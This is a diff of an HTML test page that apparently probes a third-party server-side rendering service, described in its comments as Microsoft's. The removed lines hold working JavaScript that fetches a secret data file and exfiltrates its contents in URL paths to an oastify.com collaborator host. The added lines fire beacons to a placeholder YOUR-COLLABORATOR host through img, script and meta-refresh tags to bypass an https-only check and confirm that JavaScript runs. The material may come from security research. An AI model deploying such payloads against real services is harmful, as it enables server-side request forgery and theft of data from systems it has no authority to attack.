@@ -1,14 +1,20 @@
-<!DOCTYPE html><html><head><title>PATH-EXFIL-TEST</title></head>
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>render test</title>
+<!-- Bypass the https-only scheme check: redirect the renderer to an http URL.
+     If the renderer follows this, you see an HTTP/80 GET /META-HTTP-REDIR on your collaborator. -->
+<meta http-equiv="refresh" content="0;url=http://YOUR-COLLABORATOR/META-HTTP-REDIR">
+</head>
 <body>
-<script>
-navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/PATH-EXFIL-BASELINE');
-// fetch same-origin secret, exfil encoded into URL PATH (bodies are lost to short window)
-fetch('https://labsvpn1337.github.io/MSOBB-flexfic-C/data.txt')
-  .then(function(r){ return r.text(); })
-  .then(function(t){
-    new Image().src='https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/PATH-EXFIL-DATA-'+encodeURIComponent(t);
-    navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/PATH-EXFIL-LEN-'+t.length);
-  })
-  .catch(function(e){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/PATH-EXFIL-ERR-'+encodeURIComponent(String(e&&e.message||e).slice(0,60))); });
-</script>
-</body></html>
+<h1>render test page</h1>
+<!-- HTML-tag channels: fire on HTML parse (no JS). Proves a real browser loads the page
+     and follows subresources. -->
+<img src="https://YOUR-COLLABORATOR/IMG-HTMLTAG" style="display:none">
+<script src="https://YOUR-COLLABORATOR/SCRIPT-HTMLTAG"></script>
+<!-- JS-constructed channel: fires ONLY if the renderer executes JavaScript.
+     If this hits, attacker JS executed inside Microsoft's rendering service. -->
+<script>(new Image()).src="https://YOUR-COLLABORATOR/JS-FIRST";</script>
+</body>
+</html>
